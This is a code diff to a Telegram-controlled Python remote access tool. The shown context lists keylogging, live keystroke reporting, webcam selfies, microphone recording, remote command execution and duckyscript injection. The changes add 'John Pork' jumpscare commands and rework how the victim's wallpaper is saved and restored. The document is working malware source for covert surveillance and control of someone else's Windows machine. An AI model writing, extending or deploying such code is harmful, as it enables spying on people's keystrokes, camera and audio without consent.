@@ -197,6 +197,8 @@ livekeylogger - Sends live updates about what's being typed on the keyboard.
 🦑 Misc
 plankton - Plankton.
 planktonnoaudio - Plankton no audio.
+johnpork - John Pork.
+johnporknoaudio - John Prok no audio.
 gabinetti - Gabinetti nella villa.
 duckyscript - Execute duckyscript string.
 duckyhelp - Show Duckyscript tutorial.
@@ -308,10 +310,12 @@ def randompngname(lenght: int=10) -> str:
     return randomname(lenght)+".png"
 
 def get_current_wallpaper():
-    reg_path = r"Control Panel\Desktop"
-    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
-        wallpaper, _ = winreg.QueryValueEx(key, "WallPaper")
-        return wallpaper
+    SPI_GETDESKWALLPAPER = 0x0073
+    MAX_PATH = 260
+    buffer = ctypes.create_unicode_buffer(MAX_PATH)
+    ctypes.windll.user32.SystemParametersInfoW(SPI_GETDESKWALLPAPER, MAX_PATH, buffer, 0)
+    path = buffer.value
+    return path if isfile(path) else None
 
 def backup_wallpaper(backup_path):
     current_wallpaper = get_current_wallpaper()
@@ -692,6 +696,7 @@ class PeppinoTelegram:
             "execute":self.execute,
             "selfie":self.selfie,
             "plankton":self.plankton,
+            "johnpork":self.johnpork,
             "shutdown":self.shutdown,
             "quickmenu":self.quickmenu,
             "gabinetti":self.gabinetti,
@@ -710,6 +715,7 @@ class PeppinoTelegram:
             "microphone":self.send_record_audio,
             "help":lambda: self.bsend(self.help),
             "invertedscreen":self.inverted_screen,
+            "johnporknoaudio":self.johnporknoaudio,
             "planktonnoaudio":self.planktonnoaudio,
             "distortedscreen":self.distorted_screen,
             "jumpscarenoaudio":self.jumpscarenoaudio,
@@ -918,7 +924,6 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
         res = True
         filename = join(BURN_DIRECTORY, "jxframe.png")
         backup_filename = join(BURN_DIRECTORY, "backup.png")
-        backup_wallpaper(backup_filename)
         self.opencap()
         video = VideoCapture(abspath(videofilename))
         while res:
@@ -929,28 +934,31 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
         remove(filename)
         remove(backup_filename)
         self.closecap()
+        self.restore_wallpaper()
 
     def setCameraAsWallpaper(self, seconds: float|int=5):
+        old_wallpaper_frame = imread(self.backup_wallpaper_path)
         seconds = int(seconds)
         loading_bar = self.new_loading_bar(label="Set Camera As Wallpaper", total=seconds, showperc=True)
         filename = join(BURN_DIRECTORY, "jxframe.png")
-        backup_filename = join(BURN_DIRECTORY, "backup.png")
         start = time()
         res = True
-        backup_wallpaper(backup_filename)
         self.opencap()
         while time()-start <= seconds and res:
             loading_bar.update(time()-start)
             res, frame = self.cap.read()
+            #frame = resize(frame, old_wallpaper_frame.shape[:2])
             imwrite(filename, frame)
             change_wallpaper(filename)
         loading_bar.set100()
         self.closecap()
-        change_wallpaper(backup_filename)
         sleep(1)
-        remove(filename)
-        remove(backup_filename)
+        try:
+            remove(filename)
+        except FileNotFoundError:
+            ...
         loading_bar.delete()
+        self.restore_wallpaper()
 
     def keylogger(self, timeout: int=10) -> None:
         buffer = StringIO()
@@ -1295,15 +1303,20 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o
         recording_thread.join()
         status_message.delete()
 
+    def johnpork(self, audio=True) -> None:
+        self.jumpscare("johnpork_meme", "johnpork", playaudio=audio)
+
+    def johnporknoaudio(self) -> None:
+        self.johnpork(False)
     
     def plankton(self, audio=True) -> None:
-        self.jumpscare("plankton", "plankton", playaudio=audio)
+        self.jumpscare("plankton_meme", "plankton", playaudio=audio)
     
     def planktonnoaudio(self) -> None:
         self.plankton(audio=False)
     
     def gabinetti(self) -> None:
-        self.jumpscare("plankton", "gabinetti")
+        self.jumpscare("plankton_meme", "gabinetti")
 
     """
 ooooooooo.         .o.       ooooooooo.    .oooooo..o ooooo ooooo      ooo   .oooooo.    
@@ -1420,7 +1433,6 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
 
         elif filename.endswith(".mp4"):
             caption = msg["caption"]
-            old_wallpaper = backup_wallpaper("backup_wallpaper.png")
             if caption == "/setvideowallpaper":
                 video_stream = VideoCapture(saved_filepath)
                 res = True
@@ -1429,7 +1441,6 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
                     imwrite("tmp.png", frame)
                     change_wallpaper(abspath("tmp.png"))
                     remove("tmp.png")
-                change_wallpaper(old_wallpaper)
         
     def handle(self, msg: str) -> None:
         content_type, chat_type, chat_id = glance(msg)
@@ -1491,13 +1502,9 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
         self.update_commands()
         self.images = load_images()
         nomemes = list(self.images.copy().keys())
-        self.nomemes = filter(lambda x: not("meme") in x, nomemes)
+        self.nomemes = filter(lambda x: not("meme" in x), nomemes)
         self.audios = load_audios()
-        self.backup_wallpaper_path = join(BURN_DIRECTORY, "wppbkp.png")
-        try:
-            backup_wallpaper(self.backup_wallpaper_path) 
-        except PermissionError:
-            ...
+        self.backup_wallpaper_path = join(BURN_DIRECTORY, get_current_wallpaper())
         self.cantopenthread = Thread(target=self.cantopenkiller)
         self.cantopenthread.start()
         if not sys.argv[1:]:
